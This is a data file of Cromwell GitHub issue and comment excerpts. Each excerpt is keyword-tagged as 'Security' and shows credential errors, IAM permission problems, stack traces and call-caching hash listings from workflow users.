(aws.accessKeyId)., EnvironmentVariableCredentialsProvider(): Unable to load credentials from system settings. Access key must be specified either via environment variable (AWS_ACCESS_KEY_ID) or system property (aws.accessKeyId)., ProfileCredentialsProvider(profileName=default, profileFile=ProfileFile(profiles=[Profile(name=service1, properties=[aws_access_key_id, aws_secret_access_key]), Profile(name=service2, properties=[aws_access_key_id, aws_secret_access_key])])): Profile file contained no credentials for profile 'default': ProfileFile(profiles=[Profile(name=service1, properties=[aws_access_key_id, aws_secret_access_key]), Profile(name=service2, properties=[aws_access_key_id, aws_secret_access_key])]), ContainerCredentialsProvider(): Cannot fetch credentials from container - neither AWS_CONTAINER_CREDENTIALS_FULL_URI or AWS_CONTAINER_CREDENTIALS_RELATIVE_URI environment variables are set., InstanceProfileCredentialsProvider(): Unable to load credentials from service endpoint.]; cromwell_1 | 	",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5452:1877,access,accessKeyId,1877,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5452,1,['access'],['accessKeyId']
Security,"have Cromwell automatically look for (and co-localize) accessory files when given files with a specific extensions. E.g. if I give it foo.bam file it should look for foo.bai. . Note that sometimes it's just a matter of swapping the extension, but sometimes it's adding another extension, and there can be multiple accessory files, e.g. reference.fasta is always accompanied by both reference.fasta.fai and reference.dict. . This would ideally be configurable by the Cromwell admin, who would set up a list of primary file extensions and their accessory file naming patterns. Bonus points if the user can provide their own config on the command line to override the server's config. And also I want a pet unicorn that farts glitter. ----. WDL folks;; This is a followup from a recent discussion about getting compatible bcbio generated WDL (http://gatkforums.broadinstitute.org/wdl/discussion/9257/object-attribute-access-and-secondary-index-files). Thanks to all the great help you've provided we now have compatible WDL output that passes validation:. https://github.com/bcbio/test_bcbio_cwl/blob/master/run_info-cwl-wdl. This is brilliant, and I'd like to move into testing runs with Cromwell. Before starting this, there is one major area I know we're missing in the conversion, handling of secondary files and directories of files. CWL has the notion of secondaryFiles (http://www.commonwl.org/v1.0/Workflow.html#File) which you can use to block these and ensure they get staged/run next to each other. I use this in bcbio and wanted to figure out the best way to map it into WDL. There are two cases we use these for:. - Index files associated with compressed inputs, like BAM bai indices and bgzip VCF tbi indices. These are a single index file attached to the original file that should get staged in the same directory when running.; - Directories of index files like bwa or snpeff. These are a bit trickier since they can have many files and a variable number depending on the input. What is ",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2269:1193,validat,validation,1193,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2269,1,['validat'],['validation']
Security,"have followed the long set of instructions. I have logged in with my `<google-user-id>`, I have set my own `<google-project-id>`. I have created my own bucket. I have generate my service account key with the command:; ```; gcloud iam service-accounts keys create sa.json --iam-account ""$EMAIL""; ```. Then I run the hello.wdl with the command:; ```; GOOGLE_APPLICATION_CREDENTIALS=sa.json; java -Dconfig.file=google.conf -jar cromwell-52.jar run hello.wdl -i hello.inputs; ```. But I get the following error:; ```; [2020-07-27 18:34:00,37] [error] PipelinesApiAsyncBackendJobExecutionActor [3d2d7a27wf_hello.hello:NA:1]: Error attempting to Execute; cromwell.engine.io.IoAttempts$EnhancedCromwellIoException: [Attempted 1 time(s)] - StorageException: xxx@xxx.iam.gserviceaccount.com does not have serviceusage.services.use access to the Google Cloud project.; Caused by: com.google.cloud.storage.StorageException: xxx@xxx.iam.gserviceaccount.com does not have serviceusage.services.use access to the Google Cloud project.; 	at com.google.cloud.storage.spi.v1.HttpStorageRpc.translate(HttpStorageRpc.java:227); 	at com.google.cloud.storage.spi.v1.HttpStorageRpc.create(HttpStorageRpc.java:308); 	at com.google.cloud.storage.StorageImpl$3.call(StorageImpl.java:213); 	at com.google.cloud.storage.StorageImpl$3.call(StorageImpl.java:210); 	at com.google.api.gax.retrying.DirectRetryingExecutor.submit(DirectRetryingExecutor.java:105); 	at com.google.cloud.RetryHelper.run(RetryHelper.java:76); 	at com.google.cloud.RetryHelper.runWithRetries(RetryHelper.java:50); 	at com.google.cloud.storage.StorageImpl.internalCreate(StorageImpl.java:209); 	at com.google.cloud.storage.StorageImpl.create(StorageImpl.java:171); 	at cromwell.filesystems.gcs.GcsPath.request$1(GcsPathBuilder.scala:196); 	at cromwell.filesystems.gcs.GcsPath.$anonfun$writeContent$2(GcsPathBuilder.scala:203); 	at cromwell.filesystems.gcs.GcsPath.$anonfun$writeContent$2$adapted(GcsPathBuilder.scala:203); 	at cromwell.filesystems.gcs.GcsE",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5594:1142,access,access,1142,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5594,1,['access'],['access']
Security,"he Travis output, the build failure is currently being caused by:; ```; [0m[[0minfo[0m] [0m[31m*** 1 TEST FAILED ***[0m[0m; [0m[[0minfo[0m] [0m[31mWdlSubworkflowWomSpec:[0m[0m; [0m[[0minfo[0m] [0m[31mWdlNamespaces with subworkflows [0m[0m; [0m[[0minfo[0m] [0m[31m- should support WDL to WOM conversion of subworkflow calls *** FAILED *** (51 milliseconds)[0m[0m; [0m[[0minfo[0m] [0m[31m wdl4s.parser.WdlParser$SyntaxError: ERROR: out is declared as a Array[String] but the expression evaluates to a String:[0m[0m; [0m[[0minfo[0m] [0m[31m[0m[0m; [0m[[0minfo[0m] [0m[31m Array[String] out = inner.out[0m[0m; [0m[[0minfo[0m] [0m[31m ^[0m[0m; [0m[[0minfo[0m] [0m[31m at wdl.WdlNamespace$.$anonfun$typeCheckDeclaration$1(WdlNamespace.scala:493)[0m[0m; [0m[[0minfo[0m] [0m[31m at scala.Option.flatMap(Option.scala:171)[0m[0m; [0m[[0minfo[0m] [0m[31m at wdl.WdlNamespace$.typeCheckDeclaration(WdlNamespace.scala:488)[0m[0m; [0m[[0minfo[0m] [0m[31m at wdl.WdlNamespace$.validateDeclaration(WdlNamespace.scala:466)[0m[0m; [0m[[0minfo[0m] [0m[31m at wdl.WdlNamespace$.$anonfun$apply$35(WdlNamespace.scala:381)[0m[0m; [0m[[0minfo[0m] [0m[31m at scala.collection.TraversableLike.$anonfun$flatMap$1(TraversableLike.scala:241)[0m[0m; [0m[[0minfo[0m] [0m[31m at scala.collection.Iterator.foreach(Iterator.scala:929)[0m[0m; [0m[[0minfo[0m] [0m[31m at scala.collection.Iterator.foreach$(Iterator.scala:929)[0m[0m; [0m[[0minfo[0m] [0m[31m at scala.collection.AbstractIterator.foreach(Iterator.scala:1417)[0m[0m; [0m[[0minfo[0m] [0m[31m at scala.collection.IterableLike.foreach(IterableLike.scala:71)[0m[0m; ```. I'm not sure whether you intended to roll back that change at the same time as rolling back the test case? I think we can argue to make the set of coercions explicit in draft 3 (and not include `X => Array[X]`), but IMO we shouldn't ""unsupport"" that Cromwell feature with this PR.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2807#issuecomment-342278838:1085,validat,validateDeclaration,1085,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2807#issuecomment-342278838,1,['validat'],['validateDeclaration']
Security,"he following roles:; 1. [Cloud Life Sciences](https://cloud.google.com/life-sciences/docs/concepts/access-control#roles) Workflows Runner (lifesciences.workflowsRunner); 2. [Service Account User](https://cloud.google.com/iam/docs/service-accounts#user-role) (iam.serviceAccountUser); 3. [Storage Object](https://cloud.google.com/storage/docs/access-control/iam-roles) Creator (roles/storage.objectCreator); 4. [Storage Object](https://cloud.google.com/storage/docs/access-control/iam-roles) Viewer (roles/storage.objectViewer). And I have got the following error from Cromwell:; ```; java.lang.Exception: Task xxx.xxxNA:1 failed. Job exited without an error, exit code 0. PAPI error code 9. Please check the log file for more details: xxx; ```; And the log just contains this cryptic message:; ```; yyyy/mm/dd hh:mm:ss Starting container setup.; ```; I have then tried to run Cromwell with the following roles:; 1. [Cloud Life Sciences](https://cloud.google.com/life-sciences/docs/concepts/access-control#roles) Workflows Runner (lifesciences.workflowsRunner); 2. [Service Account User](https://cloud.google.com/iam/docs/service-accounts#user-role) (iam.serviceAccountUser); 3. [Storage Object](https://cloud.google.com/storage/docs/access-control/iam-roles) Admin (storage.objectAdmin). And the workflow succeeded. To give a full explanation of the set of roles and permissions needed, I wrote a little python script `roles.py` that collects this information from Google:; ```; #!/bin/python3; import subprocess; import requests; import pandas as pd; import sys. token = subprocess.check_output([""gcloud"",""auth"",""print-access-token""]).decode(""utf8"").strip(); response = requests.get(""https://iam.googleapis.com/v1/roles"", headers={""accept"": ""application/json"", ""Authorization"": ""Bearer ""+token}, params={""pageSize"": 1000, ""view"": ""FULL""}); roles_json = response.json()['roles']; roles = [role['name'] for role in roles_json if 'includedPermissions' in role for permission in role['includedPermissions",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4304#issuecomment-685188955:1053,access,access-control,1053,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4304#issuecomment-685188955,1,['access'],['access-control']
Security,he miss; Uncaught error from thread [cromwell-system-akka.actor.default-dispatcher-2676] shutting down JVM since 'akka.jvm-exit-on-fatal-error' is enabled for ActorSystem[cromwell-system]. **java.lang.OutOfMemoryError: Java heap space**; at java.util.Arrays.copyOfRange(Arrays.java:3664); at java.lang.String.<init>(String.java:207); at java.lang.StringBuilder.toString(StringBuilder.java:407); at scala.StringContext.standardInterpolator(StringContext.scala:128); at scala.StringContext.s(StringContext.scala:95); at cromwell.engine.workflow.WorkflowActor$$anonfun$34.apply(WorkflowActor.scala:885); at cromwell.engine.workflow.WorkflowActor$$anonfun$34.apply(WorkflowActor.scala:881); at scala.collection.TraversableOnce$$anonfun$foldLeft$1.apply(TraversableOnce.scala:155); at scala.collection.TraversableOnce$$anonfun$foldLeft$1.apply(TraversableOnce.scala:155); at scala.collection.immutable.HashMap$HashMap1.foreach(HashMap.scala:221); at scala.collection.immutable.HashMap$HashTrieMap.foreach(HashMap.scala:428); at scala.collection.immutable.HashMap$HashTrieMap.foreach(HashMap.scala:428); at scala.collection.immutable.HashMap$HashTrieMap.foreach(HashMap.scala:428); at scala.collection.TraversableOnce$class.foldLeft(TraversableOnce.scala:155); at scala.collection.AbstractTraversable.foldLeft(Traversable.scala:104); at cromwell.engine.workflow.WorkflowActor.cromwell$engine$workflow$WorkflowActor$$startRunnableCalls(WorkflowActor.scala:881); at cromwell.engine.workflow.WorkflowActor$$anonfun$2.applyOrElse(WorkflowActor.scala:532); at cromwell.engine.workflow.WorkflowActor$$anonfun$2.applyOrElse(WorkflowActor.scala:467); at scala.runtime.AbstractPartialFunction.apply(AbstractPartialFunction.scala:36); at akka.actor.FSM$class.processEvent(FSM.scala:604); at cromwell.engine.workflow.WorkflowActor.akka$actor$LoggingFSM$$super$processEvent(WorkflowActor.scala:236); at akka.actor.LoggingFSM$class.processEvent(FSM.scala:734); at cromwell.engine.workflow.WorkflowActor.processEvent(Wor,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/695:10718,Hash,HashMap,10718,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/695,1,['Hash'],['HashMap']
Security,"hen I rerun the workflow I purely get a `cacheMiss`, but the metadata comparison between two of the inputs gives the following error:. ```; {; ""status"": ""error"",; ""message"": ""Failed to calculate diff for call A and call B:\nFailed to extract relevant metadata for call A (f9a2bfe7-a173-439f-8c39-4bca22552a22 / BwaAligner.bwamem:-1) (reason 1 of 1): Cannot extract hashes for File reads. Expected JsString or JsObject but got JsArray [\""ec4ed7c97d38063d4ad0587812c034e8\"",\""083ce2cf30923ff510378b1c63feb0b6\""]\nFailed to extract relevant metadata for call B (e6f82c61-4d10-4c7e-9122-815658bb874c / BwaAligner.bwamem:-1) (reason 1 of 1): Cannot extract hashes for File reads. Expected JsString or JsObject but got JsArray [\""fa22ef528d4abd40315c885e784ff6c2\"",\""df337314b38af64554899eb5ebe81c74\""]"",; ""errors"": {; ""JsArray"": {; ""elements"": [; {; ""JsString"": {; ""value"": ""Failed to extract relevant metadata for call A (f9a2bfe7-a173-439f-8c39-4bca22552a22 / BwaAligner.bwamem:-1) (reason 1 of 1): Cannot extract hashes for File reads. Expected JsString or JsObject but got JsArray [\""ec4ed7c97d38063d4ad0587812c034e8\"",\""083ce2cf30923ff510378b1c63feb0b6\""]""; }; },; {; ""JsString"": {; ""value"": ""Failed to extract relevant metadata for call B (e6f82c61-4d10-4c7e-9122-815658bb874c / BwaAligner.bwamem:-1) (reason 1 of 1): Cannot extract hashes for File reads. Expected JsString or JsObject but got JsArray [\""fa22ef528d4abd40315c885e784ff6c2\"",\""df337314b38af64554899eb5ebe81c74\""]""; }; }; ]; }; }; }; ```. I presume this means that `processField` [[CallCacheDiffActor.scala#L164-L168](https://github.com/broadinstitute/cromwell/blob/8415afa3ee7ffe83e163cce3cbd8e1c1446db372/engine/src/main/scala/cromwell/engine/workflow/lifecycle/execution/callcaching/CallCacheDiffActor.scala#L164-L168)] is missing a `case (key, subObject: JsArray)`. I confirmed this by adding the case (I don't know scala, nor inner workings of Cromwell except enough to know this probably isn't a good way to do it, but just wanted",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5348:1365,hash,hashes,1365,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5348,1,['hash'],['hashes']
Security,"hes:input:Int default_attr:max_retries|CFCD208495D565EF66E7DFF9F98764DA|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:Int default_attr:max_retries|CFCD208495D565EF66E7DFF9F98764DA|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:Int default_attr:cpu_cores|C74D97B01EAE257E44AA9D5BADE97BAF|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:Int default_attr:cpu_cores|C74D97B01EAE257E44AA9D5BADE97BAF|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:Float runtime_attr:mem_gb|5BA1DE412E01037F8843D097DCFAF28A|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:Float runtime_attr:mem_gb|5BA1DE412E01037F8843D097DCFAF28A|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:Float default_attr:mem_gb|5BA1DE412E01037F8843D097DCFAF28A|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:Float default_attr:mem_gb|5BA1DE412E01037F8843D097DCFAF28A|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:File R2Fastq|""9f1cf8859a902eb75202a5c048cd43aa-388""|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:File R2Fastq|""9f1cf8859a902eb75202a5c048cd43aa-388""|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:File R1Fastq|""62396abd6b589747ee16034888c9a0b5-381""|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:File R1Fastq|""62396abd6b589747ee16034888c9a0b5-381""|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input count|9BF31C7FF062936A96D3C8BD1F8F2FF3|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input count|9BF31C7FF062936A96D3C8BD1F8F2FF3|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:command template|7BCEDB02C5FC300FF83F07417B49229E|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:command template|7BCEDB02C5FC300FF83F07417B49229E|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:backend name|2267EF43AEF6BB551F414FEC2390F68A|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashe",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7248:6052,hash,hashes,6052,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7248,1,['hash'],['hashes']
Security,hes:input:String sampleGenomicID|5844E24465D27D94BD0D311D5D189FC9|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:String sampleGenomicID|5844E24465D27D94BD0D311D5D189FC9|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:String runtime_attr:queueArn|2382ECF7BF8F09D7CD67C24B52AD78BF|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:String runtime_attr:queueArn|2382ECF7BF8F09D7CD67C24B52AD78BF|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:String runtime_attr:docker|A5281F25296D4311ED0C46422719018E|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:String runtime_attr:docker|A5281F25296D4311ED0C46422719018E|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:String default_attr:queueArn|2382ECF7BF8F09D7CD67C24B52AD78BF|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:String default_attr:queueArn|2382ECF7BF8F09D7CD67C24B52AD78BF|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:String default_attr:docker|A5281F25296D4311ED0C46422719018E|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:String default_attr:docker|A5281F25296D4311ED0C46422719018E|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:Int runtime_attr:max_retries|CFCD208495D565EF66E7DFF9F98764DA|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:Int runtime_attr:max_retries|CFCD208495D565EF66E7DFF9F98764DA|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:Int runtime_attr:cpu_cores|C74D97B01EAE257E44AA9D5BADE97BAF|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:Int runtime_attr:cpu_cores|C74D97B01EAE257E44AA9D5BADE97BAF|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:Int numCPUs|C74D97B01EAE257E44AA9D5BADE97BAF|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:Int numCPUs|C74D97B01EAE257E44AA9D5BADE97BAF|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:Int default_attr:,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7248:4078,hash,hashes,4078,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7248,1,['hash'],['hashes']
Security,"hi @DavyCats could you let us know:; - the git-hash of Cromwell that you built; - how you're running the workflow (eg run mode, server mode with zip, server mode with URL)?. Thanks!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3986#issuecomment-411172615:47,hash,hash,47,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3986#issuecomment-411172615,1,['hash'],['hash']
Security,hing:hit|false|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hit|false|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:runtime attribute:failOnStderr|68934A3E9455FA72420237EB05902327|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:runtime attribute:failOnStderr|68934A3E9455FA72420237EB05902327|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:runtime attribute:docker|4AD3C387725244C1348F252B031B956D|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:runtime attribute:docker|4AD3C387725244C1348F252B031B956D|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:runtime attribute:continueOnReturnCode|CFCD208495D565EF66E7DFF9F98764DA|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:runtime attribute:continueOnReturnCode|CFCD208495D565EF66E7DFF9F98764DA|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:output expression:File sorted_bam|816FBD6EEA5D806309AA0664E2F2AB86|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:output expression:File sorted_bam|816FBD6EEA5D806309AA0664E2F2AB86|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:output count|C4CA4238A0B923820DCC509A6F75849B|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:output count|C4CA4238A0B923820DCC509A6F75849B|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:String sampleRunID|A3F4D40B1A8326642B9C761E2FE16F3E|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:String sampleRunID|A3F4D40B1A8326642B9C761E2FE16F3E|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:String sampleGenomicID|5844E24465D27D94BD0D311D5D189FC9|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:String sampleGenomicID|5844E24465D27D94BD0D311D5D189FC9|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:String runtime_attr:queueArn|2382ECF7BF8F09D7CD67C24B52AD78BF|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:String runtime_attr:queueArn|2382ECF7BF8F09D7CD67C24,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7248:2508,hash,hashes,2508,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7248,1,['hash'],['hashes']
Security,"hit.; [2022-10-06 15:14:54,70] [info] 12ceda02-4906-4840-80a2-514af3ccb801-EngineJobExecutionActor-test.task_A:NA:1 [ESC[38;5;2m12ceda02ESC[0m]: Could not copy a suitable cache hit for 12ceda02:test.task_A:-1:1. No copy attempts were made. Based on [StackOverflow, the issue seems to be simply that subqueries must be aliased.](https://stackoverflow.com/q/1888779/4107809) Is MariaDB not supported? . The workflow runs jobs that complete as normal. When rerunning, no call caching results are used, and all jobs simply run again. . Cromwell connects to the call caching database and successfully creates tables, for example `CALL_CACHING_AGGREGATION_ENTRY`. . <!-- Which backend are you running? -->; I am running with a SLURM backend. . <!-- Paste/Attach your workflow if possible: -->; I have a very simple example workflow. ; ```; workflow test{; call task_A {}; }. task task_A{; command{; echo 'testing'; }; }; ```. <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->; ```; include required(classpath(""application"")). webservice {; }. akka {; http {; server {; }; }; }. system {; io {; }; input-read-limits {; }; job-rate-control {; jobs = 2; per = 1 second; }. abort {; scan-frequency: 30 seconds; cache {; enabled: true; concurrency: 1; ttl: 20 minutes; size: 100000; }; }. dns-cache-ttl: 3 minutes; }. workflow-options {; default {; }; }. call-caching {; enabled = true; }. google {; }. docker {; hash-lookup {; }; }. engine {; filesystems {; local {; }; }; }. languages {; WDL {; versions {; ""draft-2"" {; }; ""1.0"" {; }; }; }; CWL {; versions {; ""v1.0"" {; }; }; }; }. backend {; default = ""SLURM"". providers {. SLURM {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {; concurrent-job-limit = 500; runtime-attributes = """"""; Int runtime_minutes = 720; Int cpus = 1; Int requested_memory_mb_per_core = 8000; String queue = ""short""; """""". exit-code-timeout-seconds = 600. submit = """"""; sbat",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6929:2291,PASSWORD,PASSWORDS,2291,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6929,1,['PASSWORD'],['PASSWORDS']
Security,hods.scala:18); 	at cromwell.filesystems.sra.SraPath.hashCode(SraPathBuilder.scala:26); 	at scala.runtime.Statics.anyHash(Statics.java:122); 	at scala.util.hashing.MurmurHash3.productHash(MurmurHash3.scala:68); 	at scala.util.hashing.MurmurHash3$.productHash(MurmurHash3.scala:215); 	at scala.runtime.ScalaRunTime$._hashCode(ScalaRunTime.scala:149); 	at cromwell.core.io.DefaultIoCommand$DefaultIoSizeCommand.hashCode(DefaultIoCommand.scala:14); 	at scala.runtime.Statics.anyHash(Statics.java:122); 	at scala.util.hashing.MurmurHash3.productHash(MurmurHash3.scala:68); 	at scala.util.hashing.MurmurHash3$.productHash(MurmurHash3.scala:215); 	at scala.runtime.ScalaRunTime$._hashCode(ScalaRunTime.scala:149); 	at cromwell.core.io.IoPromiseProxyActor$IoCommandWithPromise.hashCode(IoPromiseProxyActor.scala:11); 	at com.google.common.base.Equivalence$Equals.doHash(Equivalence.java:348); 	at com.google.common.base.Equivalence.hash(Equivalence.java:112); 	at com.google.common.cache.LocalCache.hash(LocalCache.java:1696); 	at com.google.common.cache.LocalCache.getIfPresent(LocalCache.java:3956); 	at com.google.common.cache.LocalCache$LocalManualCache.getIfPresent(LocalCache.java:4865); 	at cromwell.engine.io.IoActorProxy$$anonfun$receive$1.applyOrElse(IoActorProxy.scala:25); 	at akka.actor.Actor.aroundReceive(Actor.scala:539); 	at akka.actor.Actor.aroundReceive$(Actor.scala:537); 	at cromwell.engine.io.IoActorProxy.aroundReceive(IoActorProxy.scala:16); 	at akka.actor.ActorCell.receiveMessage(ActorCell.scala:612); 	at akka.actor.ActorCell.invoke(ActorCell.scala:581); 	at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:268); 	at akka.dispatch.Mailbox.run(Mailbox.scala:229); 	at akka.dispatch.Mailbox.exec(Mailbox.scala:241); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoi,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5793#issuecomment-679399680:1685,hash,hash,1685,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5793#issuecomment-679399680,1,['hash'],['hash']
Security,"hsqldb.tx=mvcc; [2016-09-13 17:39:33,39] [info] WorkflowManagerActor submitWorkflow input id = None, effective id = 8eab0d5a-925a-4e99-ae3b-f30dfadacb58; Uncaught error from thread [cromwell-system-akka.actor.default-dispatcher-2] shutting down JVM since 'akka.jvm-exit-on-fatal-error' is enabled for ActorSystem[cromwell-system]; java.lang.ExceptionInInitializerError; at cromwell.engine.backend.local.SharedFileSystem$class.rootPath(SharedFileSystem.scala:113); at cromwell.engine.backend.sge.SgeBackend.rootPath(SgeBackend.scala:47); at cromwell.engine.workflow.MaterializeWorkflowDescriptorActor$$anonfun$cromwell$engine$workflow$MaterializeWorkflowDescriptorActor$$buildWorkflowDescriptor$1$1.apply(MaterializeWorkflowDescriptorActor.scala:87); at cromwell.engine.workflow.MaterializeWorkflowDescriptorActor$$anonfun$cromwell$engine$workflow$MaterializeWorkflowDescriptorActor$$buildWorkflowDescriptor$1$1.apply(MaterializeWorkflowDescriptorActor.scala:86); at scalaz.ValidationFlatMap.flatMap(Validation.scala:433); at cromwell.engine.workflow.MaterializeWorkflowDescriptorActor.cromwell$engine$workflow$MaterializeWorkflowDescriptorActor$$buildWorkflowDescriptor$1(MaterializeWorkflowDescriptorActor.scala:86); at cromwell.engine.workflow.MaterializeWorkflowDescriptorActor$$anonfun$cromwell$engine$workflow$MaterializeWorkflowDescriptorActor$$buildWorkflowDescriptor$2$$anonfun$apply$8.apply(MaterializeWorkflowDescriptorActor.scala:110); at cromwell.engine.workflow.MaterializeWorkflowDescriptorActor$$anonfun$cromwell$engine$workflow$MaterializeWorkflowDescriptorActor$$buildWorkflowDescriptor$2$$anonfun$apply$8.apply(MaterializeWorkflowDescriptorActor.scala:109); at scalaz.ValidationFlatMap.flatMap(Validation.scala:433); at cromwell.engine.workflow.MaterializeWorkflowDescriptorActor$$anonfun$cromwell$engine$workflow$MaterializeWorkflowDescriptorActor$$buildWorkflowDescriptor$2.apply(MaterializeWorkflowDescriptorActor.scala:109); at cromwell.engine.workflow.MaterializeWorkflowDescrip",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1406:3590,Validat,Validation,3590,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1406,1,['Validat'],['Validation']
Security,"https://broadworkbench.atlassian.net/browse/BA-2919; All future updates to this issue will be posted in JIRA. Sorry for the inconvenience, but you will need to create a free account to access it.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2919#issuecomment-506468209:185,access,access,185,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2919#issuecomment-506468209,1,['access'],['access']
